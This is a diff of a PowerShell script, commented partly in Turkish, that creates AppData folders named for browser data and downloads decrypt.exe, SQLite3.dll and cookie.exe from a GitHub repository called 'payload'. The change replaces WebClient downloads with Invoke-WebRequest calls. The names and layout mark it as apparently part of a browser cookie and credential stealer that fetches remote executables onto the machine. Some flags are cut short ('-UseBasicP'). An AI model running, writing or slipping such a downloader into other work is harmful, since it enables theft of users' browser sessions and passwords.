@@ -2,16 +2,9 @@ New-Item -Path "$env:APPDATA\BrowserData" -ItemType Directory -Force
 New-Item -Path "$env:APPDATA\BrowserData\Chrome" -ItemType Directory -Force
 New-Item -Path "$env:APPDATA\ZippedBrowserData" -ItemType Directory -Force
 Set-Content -Path "$env:APPDATA\BrowserData\script.ps1" -Value ""
-# HTTPS isteği yaparken sertifika doğrulamasını atlamak için
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# WebClient nesnesi oluşturarak dosyaları indirme
-$wc = New-Object System.Net.WebClient
-
-# Dosyaları indirme
-$wc.DownloadFile("https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/decrypt.exe", "$env:APPDATA\BrowserData\Chrome\decrypt.exe")
-$wc.DownloadFile("https://github.com/AlpoProo/payload/raw/refs/heads/main/SQLite3.dll", "$env:APPDATA\BrowserData\Chrome\SQLite3.dll")
-$wc.DownloadFile("https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/cookie.exe", "$env:APPDATA\BrowserData\Chrome\cookie.exe")
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/decrypt.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\decrypt.exe" -UseBasicP
+Invoke-WebRequest -Uri "https://github.com/AlpoProo/payload/raw/refs/heads/main/SQLite3.dll" -OutFile "$env:APPDATA\BrowserData\Chrome\SQLite3.dll" -UseBasicP
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/cookie.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\cookie.exe" -UseBasicP
 
 
 # Set destination directory directly to AppData
